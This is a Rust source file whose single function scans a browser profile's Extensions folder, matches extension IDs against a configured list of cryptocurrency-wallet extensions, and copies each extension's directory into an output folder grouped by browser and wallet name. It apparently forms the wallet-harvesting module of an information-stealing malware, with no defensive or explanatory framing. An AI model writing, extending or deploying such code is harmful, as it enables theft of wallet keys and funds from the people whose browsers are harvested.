use std::{fs, path::PathBuf};

use super::{config, utils};

pub fn get_extensions(
    browser_name: &str,
    profile_path: &PathBuf,
    output_dir: &PathBuf,
) -> usize {
    let mut extensions_count = 0;
    let extensions_path = profile_path.join("Extensions");

    if !extensions_path.exists() {
        return extensions_count;
    }

    let crypto_extensions = config::get_crypto_extensions();
    let browser_output = output_dir.join("Extensions").join(browser_name);

    if let Ok(entries) = fs::read_dir(&extensions_path) {
        for entry in entries.flatten() {
            if !entry.path().is_dir() {
                continue;
            }

            let extension_id = entry.file_name().into_string().unwrap_or_default();

            if extension_id.contains("Temp") {
                continue;
            }

            extensions_count += 1;

            let dest_path = if let Some(crypto_ext) = crypto_extensions
                .iter()
                .find(|ext| ext.extension_id == extension_id)
            {
                browser_output.join(crypto_ext.name).join(&extension_id)
            } else {
                browser_output.join("Unknown Extension").join(&extension_id)
            };

            let _ = utils::copy_directory(&entry.path(), &dest_path);
        }
    }

    extensions_count
}
